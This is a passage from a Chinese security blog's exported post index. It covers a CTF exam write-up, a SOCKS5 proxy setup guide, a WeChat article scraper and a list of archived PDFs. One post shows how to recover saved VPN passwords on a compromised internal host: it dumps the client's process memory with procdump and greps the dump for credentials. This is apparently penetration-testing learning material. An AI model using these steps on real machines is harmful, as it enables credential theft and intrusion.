<h5 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210115631.png" alt=""></p>
<p>当时没做出来…</p>
<h5 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210240685.png" alt="image-20200415210240685"></p>
<p>6379端口直接Redis未授权访问漏洞利用就可以了</p>
<p>Redis未授权访问漏洞利用：<a href="https://xz.aliyun.com/t/6103#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103#toc-0</a></p>
<h5 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210141901.png" alt="image-20200415210141901"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415212727024.png" alt="image-20200415212727024"></p>
<h5 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210621743.png" alt="image-20200415210621743"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415213042571.png" alt="image-20200415213042571"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415211006676.png" alt="image-20200415211006676"></p>
<h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415213423379.png" alt="image-20200415213423379"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7搭建Socks5</title>
    <url>/2020/04/04/Centos7%E6%90%AD%E5%BB%BASocks5/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">操作系统：Ce<span class="symbol">ntos7</span></span><br><span class="line">管理工具：Xshell</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="Socks5"><a href="#Socks5" class="headerlink" title="Socks5"></a>Socks5</h3><h4 id="Socks5安装"><a href="#Socks5安装" class="headerlink" title="Socks5安装"></a>Socks5安装</h4><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装依赖项</span></span><br><span class="line">yum <span class="keyword">install</span> gcc openldap-devel pam-devel openssl-devel -y</span><br></pre></td></tr></table></figure>

<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">wget http:<span class="string">//nchc.dl.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz</span> <span class="comment"># 下载安装包</span></span><br><span class="line">tar -xzvf ss5-3.8.9-8.tar.gz <span class="comment"># 解压缩</span></span><br><span class="line"><span class="keyword">cd</span> ss5-3.8.9 <span class="comment"># 切换目录</span></span><br><span class="line"><span class="string">./configure</span> &amp;&amp; make &amp;&amp; make install <span class="comment"># 编译安装</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404214505383.png" alt="image-20200404214505383"></p>
<h4 id="Socks5配置"><a href="#Socks5配置" class="headerlink" title="Socks5配置"></a>Socks5配置</h4><h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/<span class="keyword">opt</span>/ss5/ss5.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">auth <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> – -</span><br><span class="line">改为</span><br><span class="line">auth <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> – u</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">permit – <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> – <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> - - - - -</span><br><span class="line">改为</span><br><span class="line">permit u <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> – <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> - - - - -</span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404192600090.png" alt="image-20200404192600090"></p>
<h5 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>opt<span class="regexp">/ss5/</span>ss5.passwd</span><br><span class="line">格式：[用户名] [密码] <span class="comment">#一个用户一行</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404192352676.png" alt="image-20200404192352676"></p>
<h5 id="Socks5-启动"><a href="#Socks5-启动" class="headerlink" title="Socks5 启动"></a>Socks5 启动</h5><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">service ss5 <span class="literal">start</span></span><br></pre></td></tr></table></figure>

<h5 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h5><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">service ss5 stutas <span class="comment"># 服务状态</span></span><br><span class="line">netstat -lntp  | <span class="keyword">grep</span> ss5 <span class="comment">#网络连接 </span></span><br><span class="line">注：安全策略需要放行对应的端口策略</span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404192302483.png" alt="image-20200404192302483"></p>
<h4 id="客户端连接验证"><a href="#客户端连接验证" class="headerlink" title="客户端连接验证"></a>客户端连接验证</h4><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">curl --socks5 xx.xx.xx.<span class="string">xx:</span><span class="number">1080</span> --proxy-user <span class="string">user:</span>password <span class="string">http:</span><span class="comment">//ipinfo.io/ip</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404214334247.png" alt="image-20200404214334247"></p>
]]></content>
      <tags>
        <tag>Socks</tag>
      </tags>
  </entry>
  <entry>
    <title>公众号文章爬虫并生成PDF+HTML</title>
    <url>/2020/04/04/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>因某些原因会导致一些公众号的文章会给发布者删除，所以就想着把公众号的文章进行爬虫到本地进行留档。</p>
<a id="more"></a>

<h3 id="爬虫方法"><a href="#爬虫方法" class="headerlink" title="爬虫方法"></a>爬虫方法</h3><p>目前我了解的爬取微信公众号文章的方法主要是四种：</p>
<p>1、第三方的公众号聚合网站（如：weixin.sogou.com）；</p>
<p>2、网页版微信（现已无法限制登陆了）；</p>
<p>3、微信程序访问公众号文章的接口；</p>
<p>4、公众号平台引用文章接口（需要申请公众号）。</p>
<p>这里我们采用公众号平台引用文章接口的方式去实现。</p>
<h3 id="通过公众号平台引用文章接口爬虫思路"><a href="#通过公众号平台引用文章接口爬虫思路" class="headerlink" title="通过公众号平台引用文章接口爬虫思路"></a>通过公众号平台引用文章接口爬虫思路</h3><h4 id="引用文章接口"><a href="#引用文章接口" class="headerlink" title="引用文章接口"></a>引用文章接口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登陆公众号&gt;&gt;首页&gt;&gt;新建群发&gt;&gt;自建图文&gt;&gt;超链接</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404122132481.png" alt="image-20200404122132481"></p>
<p>通过网络请求，我们可以看到我们需要的一些数据（文章链接、标题等），如图：</p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404122534217.png" alt="image-20200404122534217"></p>
<h4 id="流程设计"><a href="#流程设计" class="headerlink" title="流程设计"></a>流程设计</h4><p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404191340454.png" alt="image-20200404191340454"></p>
<h4 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h4><p>这里就不做过程的一些分析了，所以直接贴EXE的可执行程序了（代码写的太垃圾了，就不放源码了）。</p>
<p>GitHub地址：<a href="https://github.com/ScriptKid-Beta/Wechat_Articles_Spider" target="_blank" rel="noopener">https://github.com/ScriptKid-Beta/Wechat_Articles_Spider</a></p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>安装wkhtmltopdf：</p>
<p>下载wkhtmltopdf：<a href="https://wkhtmltopdf.org/downloads.html" target="_blank" rel="noopener">https://wkhtmltopdf.org/downloads.html</a>  </p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404180406270.png" alt="image-20200404180406270"></p>
<p>将下载好的wkhtmltox-0.12.5-1.mxe-cross-win64 文件解压缩并放到跟程序同一个目录，如图：</p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404184015589.png" alt="image-20200404184015589"></p>
<p>安装chromedriver：</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#查看版本信息</span></span><br><span class="line">浏览器中输入：chrome:<span class="comment">//version/</span></span><br></pre></td></tr></table></figure>

<p>chromedriver的版本一定要与Chrome的版本一致，不然可能就不起作用。</p>
<p>下载链接：</p>
<p><a href="https://npm.taobao.org/mirrors/chromedriver/" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/chromedriver/</a></p>
<p><a href="http://chromedriver.storage.googleapis.com/index.html" target="_blank" rel="noopener">http://chromedriver.storage.googleapis.com/index.html</a></p>
<p>下载好放在跟程序同一目录下即可。</p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404183023403.png" alt="image-20200404183023403"></p>
<p>双击打开wechat_pdf.exe程序运行。</p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404191021202.png" alt="image-20200404191021202"></p>
<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404190937280.png" alt="image-20200404190937280"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/67sk-uKz9Ct4niT-f4u1KA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/67sk-uKz9Ct4niT-f4u1KA</a>?</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMDM4MTA2MA==&amp;mid=2455304609&amp;idx=1&amp;sn=b7496563aab42e92060bd68936bc4212&amp;chksm=8cfd6bcabb8ae2dc606b060fecf3f837177e3ef22a05a30ee28ebefd75c6677b29df3e426692&amp;token=2137480545&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMDM4MTA2MA==&amp;mid=2455304609&amp;idx=1&amp;sn=b7496563aab42e92060bd68936bc4212&amp;chksm=8cfd6bcabb8ae2dc606b060fecf3f837177e3ef22a05a30ee28ebefd75c6677b29df3e426692&amp;token=2137480545&amp;lang=zh_CN#rd</a></p>
]]></content>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-VPN密码获取小技巧</title>
    <url>/2020/03/31/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<a id="more"></a>

<h4 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h4><p>&emsp;&emsp;学习到的姿势，分享出来，手法也很基础，请各位师傅多多指教。</p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><h5 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h5><p>&emsp;&emsp;一般情况下，我们进行内网渗透过程中获取到管理员或者其他目标主机时多数情况会遇到主机中存在VPN连接客户端并大多数都是保存密码，如图：</p>
<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/01.png" alt=""></p>
<h5 id="星号查看器"><a href="#星号查看器" class="headerlink" title="星号查看器"></a>星号查看器</h5><p>&emsp;&emsp;此时获取目标时一般情况下会想到星号查看器，但是由于客户端做了防护，无法用星号查看器获取到内容，如图：</p>
<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/02.png" alt="02"></p>
<h5 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h5><p>&emsp;&emsp;发现当Client端当用户密码错误时会出现在内存中，我们可以将正确的密码后面加个字符（如：$）</p>
<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/04.png" alt="1578897375411"></p>
<p>&emsp;&emsp;然后我们将Client进程的内存进行dump，这里使用procdump，然后strings一下</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">procdump64</span><span class="selector-class">.exe</span> <span class="selector-tag">-accepteula</span> <span class="selector-tag">-ma</span> 14256 <span class="selector-tag">vpn</span><span class="selector-class">.dmp</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/05.png" alt="05"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>s vpn.dmp | grep -F <span class="string">'PIN:'</span> -A <span class="number">6</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/07.png" alt="07"></p>
<h4 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h4><p>以上测试过程纯属本人杜撰，请遵守《网络安全法》等相关法律法规。</p>
]]></content>
      <tags>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>历史文章</title>
    <url>/2020/03/29/History/</url>
    <content><![CDATA[<p>&emsp;&emsp;因之前文章采用云图床导致文章大部分挂链，现将部分历史文章进行pdf存档，后续文章采用本地图床。</p>


	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/常见未授权访问漏洞总结.pdf" width="100%" height="550" type="application/pdf">
	</div>



<a id="more"></a>


	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/OSSEC安装部署.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-color.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-easy_crypto.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-flag在index里.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web2.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web3.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-WEB4.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web5.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web基础$_GET.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web基础$_POST.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85(xp0intCTF).pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-你必须让他停下.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-变量1.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-域名解析.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-备份是个好习惯.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-头等舱.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-好多压缩包.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-怀疑人生.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-成绩单.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-本地包含.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-点击一百万次.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-矛盾.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-秋名山老司机.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-网站被黑.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-计算器.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-论剑.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-输入密码查看flag.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-速度要快.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/burp%20suite介绍.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/CBC字节翻转攻击原理.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Centos7更换软件安装源.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/MORSE与ASCII码对应表.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/PHP语法.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Python学习笔记.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/SQL注入攻击及防御.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/ssh基于密钥认证登陆.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/SSH密码暴力破解及防御实战笔记.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Web信息收集之搜索引擎.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/XSS跨站脚本攻击.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/zip压缩包--加密破解篇.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/zip文件格式说明.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/内网信息收集.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/文件上传.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/正则表达式之零宽断言.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/目标信息收集.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/AWVS%20介绍.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/CVE_2019_0708复现.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/fastjson漏洞复现.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/mimipenguin.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Redis漏洞复现.pdf" width="100%" height="550" type="application/pdf">
	</div>


]]></content>
      <categories>
        <category>历史文章</category>
      </categories>
      <tags>
        <tag>历史文章</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习笔记</title>
    <url>/2019/03/27/201939/</url>
    <content><![CDATA[<iframe id="embed_dom" name="embed_dom" frameborder="0" style="display:block;width:100%; height:600px;" src="https://www.processon.com/embed/mind/5c0a7900e4b0e4a514241578"></iframe>
<a id="more"></a>

<p>一款挺好的在线创作的思维导图、流程图等<br><a href="https://www.processon.com/i/5c09c763e4b0ca4b40cae793" target="_blank" rel="noopener">https://www.processon.com/i/5c09c763e4b0ca4b40cae793</a></p>
<p>PNG格式<br><a href="http://assets.processon.com/chart_image/5c0a7900e4b0e4a51424157b.png" target="_blank" rel="noopener">http://assets.processon.com/chart_image/5c0a7900e4b0e4a51424157b.png</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>勿忘初心</title>
    <url>/2019/01/29/2019/</url>
    <content><![CDATA[<p>努力努力再努力</p>
<a id="more"></a>
<p>Hello,Blog!</p>
]]></content>
      <categories>
        <category>勿忘初心</category>
      </categories>
      <tags>
        <tag>努力努力再努力</tag>
      </tags>
  </entry>
</search>
